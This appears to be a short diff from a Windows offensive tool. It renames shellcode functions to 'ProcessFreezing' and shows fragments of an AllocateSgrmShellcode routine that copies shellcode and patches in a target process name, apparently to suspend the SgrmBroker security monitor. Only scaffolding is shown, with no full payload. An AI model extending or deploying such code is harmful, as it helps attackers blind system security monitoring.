@@ -14,7 +14,7 @@ static DWORD g_dwShellcode = 0;
 static
 BOOL
 WINAPI
-ShellCode_DuplicateHandle_start()
+ShellCode_ProcessFreezing_start()
 {
     BOOL status = FALSE;
     BOOL isBrokerSuspended = FALSE;
@@ -258,7 +258,7 @@ Exit:
 static
 BOOL
 WINAPI
-ShellCode_DuplicateHandle_end() { return 0; }
+ShellCode_ProcessFreezing_end() { return 0; }
 #pragma optimize ("", on)
 
 
@@ -419,7 +419,7 @@ AllocateSgrmShellcode(
         { targetProcessName, 0x15151515, 0 }
     };
     DWORD FakeDwordsCount = sizeof(ReplDwords) / sizeof(REPLACEABLE_DWORD);
-    DWORD szShellcode = (DWORD)((PBYTE)ShellCode_DuplicateHandle_end - (PBYTE)ShellCode_DuplicateHandle_start); // This was a SIZE_T
+    DWORD szShellcode = (DWORD)((PBYTE)ShellCode_ProcessFreezing_end - (PBYTE)ShellCode_ProcessFreezing_start);
     PVOID pLocalHandler = nullptr;
     g_dwShellcode = szShellcode;
 
@@ -438,7 +438,7 @@ AllocateSgrmShellcode(
         goto Exit;
     }
 
-    RtlCopyMemory(pLocalHandler, ShellCode_DuplicateHandle_start, szShellcode);
+    RtlCopyMemory(pLocalHandler, ShellCode_ProcessFreezing_start, szShellcode);
     g_pShellcode = pLocalHandler;
 
     status = ReplaceFakePointers(
